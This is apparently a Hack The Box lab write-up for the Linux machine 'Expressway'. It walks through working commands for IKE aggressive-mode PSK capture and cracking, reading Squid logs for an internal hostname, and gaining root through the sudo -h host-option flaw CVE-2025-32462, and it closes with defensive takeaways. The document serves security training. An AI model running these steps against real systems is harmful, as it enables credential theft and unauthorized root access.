Expressway

Hack The Box Machine Report

Machine Info

Difficulty: Easy

Operating System: Linux

Status: Active

Date Completed: 15 June 2026

Summary

Expressway was a Linux machine that focused heavily on UDP enumeration, VPN/IKE discovery, password cracking, and privilege escalation through a sudo host option vulnerability. Initial TCP enumeration only revealed SSH, but UDP scanning exposed IKE services. By enumerating IKE and cracking the recovered PSK, I was able to obtain valid SSH credentials for the ike user. Further local enumeration showed the user belonged to the proxy group, which allowed access to Squid proxy logs. The logs revealed an internal hostname that was later used with the sudo -h option to escalate privileges.

IKE Enumeration

With UDP port 500 open, I used ike-scan to enumerate the IKE service. 

sudo ike-scan -M 10.129.238.52

The scan showed that the target supported IKE Main Mode with pre-shared key authentication. 

10.129.238.52 Main Mode Handshake returned
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
VID=(XAUTH)
VID=(Dead Peer Detection v1.0)

Since the machine appeared to be using IKE/IPsec, I tested aggressive mode using the identity ike and saved the captured hash for cracking. 

sudo ike-scan -M -A --id=ike --pskcrack=ike_hash.txt 10.129.238.52

The captured IKE hash was then cracked using psk-crack and the RockYou wordlist. 

psk-crack -d /usr/share/wordlists/rockyou.txt ike_hash.txt

Local Enumeration

I checked sudo permissions first, but the ike user was not allowed to run sudo normally. 

sudo -l
Sorry, user ike may not run sudo on expressway.

Since the user belonged to the proxy group, I inspected Squid proxy logs. 

grep -i "\.htb" /var/log/squid/access.log.1

The log revealed a previously accessed internal host: 

1753229688.902      0 192.168.68.50 TCP_DENIED/403 3807 GET http://offramp.expressway.htb - HIER_NONE/- text/html

The discovered host was: 

offramp.expressway.htb

Privilege Escalation

The privilege escalation path involved abusing a sudo vulnerability related to the -h host option. The relevant CVE is CVE-2025-32462. My first attempt using the local hostname failed because the vulnerable sudo behavior depended on specifying the correct host entry. The Squid logs provided the missing host: offramp.expressway.htb.

I tested sudo using the discovered hostname: 

sudo -h offramp.expressway.htb -l

After confirming the host-specific sudo behavior, I used the same host option to escalate privileges. 

sudo -h offramp.expressway.htb /bin/bash -p

Once root access was obtained, I verified the privilege level. 

whoami
id
root
uid=0(root) gid=0(root) groups=0(root)

Vulnerabilities / Misconfiguration

The first major weakness was the exposed IKE/IPsec service using a weak pre-shared key. By capturing the IKE aggressive mode handshake and cracking it offline, I was able to recover the password a clear-text password. This password was then reused for SSH access as the ike user.

The second issue was excessive access to proxy logs. The ike user belonged to the proxy group, which allowed access to Squid logs containing the internal hostname offramp.expressway.htb.

The final privilege escalation issue was related to CVE-2025-32462, a sudo vulnerability involving the -h host option. Using the hostname discovered in the Squid logs allowed the sudo host-based behavior to be abused for root access.

Defensive Takeaways

Organizations should avoid weak IKE pre-shared keys and should prefer certificate-based authentication where possible. If PSKs are used, they should be long, randomly generated, and not reused for local system accounts such as SSH users.

Access to proxy logs should be restricted because they can reveal internal hostnames, applications, and user activity. In this case, a Squid log entry exposed an internal .htb hostname that was useful for privilege escalation.

Systems should also keep sudo patched and review sudoers configurations for host-specific rules. Vulnerabilities like CVE-2025-32462 can turn seemingly limited sudo behavior into full privilege escalation when the correct host context is known.

Lessons Learned

This machine reinforced the importance of UDP enumeration. The initial TCP scan only showed SSH, so it would have been easy to miss the real attack path without scanning UDP. I also learned that IKE services can leak crackable material when aggressive mode is available and that cracked VPN credentials may be reused for SSH access.

Another key lesson was paying attention to group membership. Seeing that the ike user belonged to the proxy group led directly to the Squid logs, which revealed the internal hostname needed for the sudo privilege escalation path.
